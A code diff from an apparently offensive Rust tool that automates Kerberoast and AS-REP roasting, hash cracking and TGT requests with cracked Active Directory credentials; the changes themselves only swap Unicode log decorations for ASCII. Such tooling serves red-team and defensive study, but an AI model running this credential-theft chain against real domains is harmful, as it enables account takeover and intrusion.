@@ -1,4 +1,4 @@
-//! Integrated Roast → Crack → Replay Loop
+//! Integrated Roast -> Crack -> Replay Loop
 //!
 //! Automates the full attack chain:
 //! 1. Kerberoast or AS-REP roast target accounts
@@ -20,11 +20,11 @@ use overthrone_core::proto::kerberos;
 use serde::{Deserialize, Serialize};
 use tracing::{info, warn};
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Auto-Crack Result
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
-/// Result of the integrated roast→crack→replay loop
+/// Result of the integrated roast->crack->replay loop
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct AutoCrackResult {
     /// Successfully cracked credentials with TGTs
@@ -50,11 +50,11 @@ pub struct CrackedTicket {
     pub ticket_expiry: String,
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Integrated Loop
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
-/// Run the full roast→crack→replay loop for Kerberoast
+/// Run the full roast->crack->replay loop for Kerberoast
 ///
 /// This function:
 /// 1. Performs kerberoasting to extract TGS hashes
@@ -77,9 +77,9 @@ pub async fn kerberoast_auto_crack(
 ) -> Result<AutoCrackResult> {
     let start = std::time::Instant::now();
 
-    info!("╔══════════════════════════════════════════════════════╗");
-    info!("║  Kerberoast → Crack → TGT Replay Loop              ║");
-    info!("╚══════════════════════════════════════════════════════╝");
+    info!("+======================================================+");
+    info!("|  Kerberoast -> Crack -> TGT Replay Loop              |");
+    info!("+======================================================+");
 
     // Step 1: Kerberoast
     info!("Step 1/3: Performing kerberoast...");
@@ -91,7 +91,7 @@ pub async fn kerberoast_auto_crack(
     );
 
     if roast_result.hashes.is_empty() {
-        warn!("No hashes extracted — aborting crack loop");
+        warn!("No hashes extracted -- aborting crack loop");
         return Ok(AutoCrackResult {
             cracked_with_tickets: Vec::new(),
             cracked_failed_ticket: Vec::new(),
@@ -112,7 +112,7 @@ pub async fn kerberoast_auto_crack(
     );
 
     if crack_report.cracked.is_empty() {
-        warn!("No hashes cracked — aborting TGT requests");
+        warn!("No hashes cracked -- aborting TGT requests");
         return Ok(AutoCrackResult {
             cracked_with_tickets: Vec::new(),
             cracked_failed_ticket: Vec::new(),
@@ -150,7 +150,7 @@ pub async fn kerberoast_auto_crack(
                 let expiry = format_ticket_expiry(&tgt_response);
 
                 info!(
-                    "  ✓ TGT obtained for {}\\{} (expires: {})",
+                    "  [+] TGT obtained for {}\\{} (expires: {})",
                     credential.domain, credential.username, expiry
                 );
 
@@ -162,7 +162,7 @@ pub async fn kerberoast_auto_crack(
             }
             Err(e) => {
                 warn!(
-                    "  ✗ Failed to request TGT for {}\\{}: {}",
+                    "  [-] Failed to request TGT for {}\\{}: {}",
                     credential.domain, credential.username, e
                 );
                 cracked_failed_ticket.push(credential.clone());
@@ -172,26 +172,26 @@ pub async fn kerberoast_auto_crack(
 
     let total_time = start.elapsed().as_millis() as u64;
 
-    info!("╔══════════════════════════════════════════════════════╗");
-    info!("║  Auto-Crack Loop Complete                           ║");
+    info!("+======================================================+");
+    info!("|  Auto-Crack Loop Complete                           |");
     info!(
-        "║  Total hashes: {}                              ║",
+        "|  Total hashes: {}                              |",
         roast_result.hashes.len()
     );
     info!(
-        "║  Cracked with TGTs: {}                          ║",
+        "|  Cracked with TGTs: {}                          |",
         cracked_with_tickets.len()
     );
     info!(
-        "║  Cracked (no TGT): {}                           ║",
+        "|  Cracked (no TGT): {}                           |",
         cracked_failed_ticket.len()
     );
     info!(
-        "║  Failed to crack: {}                              ║",
+        "|  Failed to crack: {}                              |",
         crack_report.failed.len()
     );
-    info!("║  Total time: {}ms                          ║", total_time);
-    info!("╚══════════════════════════════════════════════════════╝");
+    info!("|  Total time: {}ms                          |", total_time);
+    info!("+======================================================+");
 
     Ok(AutoCrackResult {
         cracked_with_tickets,
@@ -202,7 +202,7 @@ pub async fn kerberoast_auto_crack(
     })
 }
 
-/// Run the full roast→crack→replay loop for AS-REP
+/// Run the full roast->crack->replay loop for AS-REP
 ///
 /// This function:
 /// 1. Performs AS-REP roasting to extract AS-REP hashes
@@ -216,9 +216,9 @@ pub async fn asrep_auto_crack(
 ) -> Result<AutoCrackResult> {
     let start = std::time::Instant::now();
 
-    info!("╔══════════════════════════════════════════════════════╗");
-    info!("║  AS-REP Roast → Crack → TGT Replay Loop            ║");
-    info!("╚══════════════════════════════════════════════════════╝");
+    info!("+======================================================+");
+    info!("|  AS-REP Roast -> Crack -> TGT Replay Loop            |");
+    info!("+======================================================+");
 
     // Step 1: AS-REP Roast
     info!("Step 1/3: Performing AS-REP roast...");
@@ -226,7 +226,7 @@ pub async fn asrep_auto_crack(
     info!("  Extracted {} hashes", roast_result.hashes.len());
 
     if roast_result.hashes.is_empty() {
-        warn!("No hashes extracted — aborting crack loop");
+        warn!("No hashes extracted -- aborting crack loop");
         return Ok(AutoCrackResult {
             cracked_with_tickets: Vec::new(),
             cracked_failed_ticket: Vec::new(),
@@ -247,7 +247,7 @@ pub async fn asrep_auto_crack(
     );
 
     if crack_report.cracked.is_empty() {
-        warn!("No hashes cracked — aborting TGT requests");
+        warn!("No hashes cracked -- aborting TGT requests");
         return Ok(AutoCrackResult {
             cracked_with_tickets: Vec::new(),
             cracked_failed_ticket: Vec::new(),
@@ -285,7 +285,7 @@ pub async fn asrep_auto_crack(
                 let expiry = format_ticket_expiry(&tgt_response);
 
                 info!(
-                    "  ✓ TGT obtained for {}\\{} (expires: {})",
+                    "  [+] TGT obtained for {}\\{} (expires: {})",
                     credential.domain, credential.username, expiry
                 );
 
@@ -297,7 +297,7 @@ pub async fn asrep_auto_crack(
             }
             Err(e) => {
                 warn!(
-                    "  ✗ Failed to request TGT for {}\\{}: {}",
+                    "  [-] Failed to request TGT for {}\\{}: {}",
                     credential.domain, credential.username, e
                 );
                 cracked_failed_ticket.push(credential.clone());
@@ -307,26 +307,26 @@ pub async fn asrep_auto_crack(
 
     let total_time = start.elapsed().as_millis() as u64;
 
-    info!("╔══════════════════════════════════════════════════════╗");
-    info!("║  Auto-Crack Loop Complete                           ║");
+    info!("+======================================================+");
+    info!("|  Auto-Crack Loop Complete                           |");
     info!(
-        "║  Total hashes: {}                              ║",
+        "|  Total hashes: {}                              |",
         roast_result.hashes.len()
     );
     info!(
-        "║  Cracked with TGTs: {}                          ║",
+        "|  Cracked with TGTs: {}                          |",
         cracked_with_tickets.len()
     );
     info!(
-        "║  Cracked (no TGT): {}                           ║",
+        "|  Cracked (no TGT): {}                           |",
         cracked_failed_ticket.len()
     );
     info!(
-        "║  Failed to crack: {}                              ║",
+        "|  Failed to crack: {}                              |",
         crack_report.failed.len()
     );
-    info!("║  Total time: {}ms                          ║", total_time);
-    info!("╚══════════════════════════════════════════════════════╝");
+    info!("|  Total time: {}ms                          |", total_time);
+    info!("+======================================================+");
 
     Ok(AutoCrackResult {
         cracked_with_tickets,
@@ -337,9 +337,9 @@ pub async fn asrep_auto_crack(
     })
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Helpers
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Format TGT expiry time for display
 fn format_ticket_expiry(tgt: &kerberos::TicketGrantingData) -> String {
